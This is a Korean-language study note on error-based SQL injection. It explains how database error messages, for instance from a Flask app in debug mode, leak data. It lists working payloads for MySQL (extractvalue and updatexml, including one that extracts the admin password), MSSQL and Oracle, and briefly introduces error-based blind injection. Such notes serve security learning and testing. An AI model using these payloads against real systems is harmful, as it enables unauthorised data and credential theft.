## Error based SQL Injection
### Error based SQL Injection
---
임의로 에러를 발생시켜 데이터베이스 및 운영체제의 정보를 획득하는 공격 기법이다. 
#### 공격방법
Flask 프레임워크로 개발된 애플리케이션에서 디버그 모드를 활성화하면 코드에서 오류가 발생할 때 발생 원인을 출력하는 것을 이용해서, 다양한 정보를 수집하고, 원하는 데이터를 획득한다.
* extractvalue 함수
첫 번째로 전달된 XML데이터에서 두 번째 인자인 XPATH식을 통해 데이터를 추출한다. 만약 두 번째 XPATH식이 올바르지 않을 경우 에러 메시지와 잘못된 식을 출력한다. 
```sql
SELECT extractvalue(1, concat(0x3a, version()));
SELECT extractvalue(1, concat(0x3a, (SELECT password FROM users WHERE username='admin')));
```
* updatexml
``` sql
SELECT updatexml(null, concat(0x3a, version()), null);
```
#### MSSQL 공격
```sql
SELECT convert(int, @@version);
SELECT cast((SELECT @@version) as int);
```
#### Oracle 공격
``` sql
SELECT CTXSYS.DRITHSX.SN(user, (select banner from v$version where rownum=1)) FROM dual;
```
### Error based Blind SQL Injection
---
Blind SQLI와 Error base SQLI를 결합시킨 공격기법이다. 에러를 발생시키고 참/ 거짓을 판단해 데이터를 추출한다. 
#### Short-circuit evaluation
로직 연산의 원리를 이용해 공격하는 기법이다. `AND`연산은 처음 식이 거짓이라면 뒤의 식은 실행 하지 않고, `OR`연산은 반대로 첫 번째 식이 참이라면 뒤의 식을 실행되지 않는다.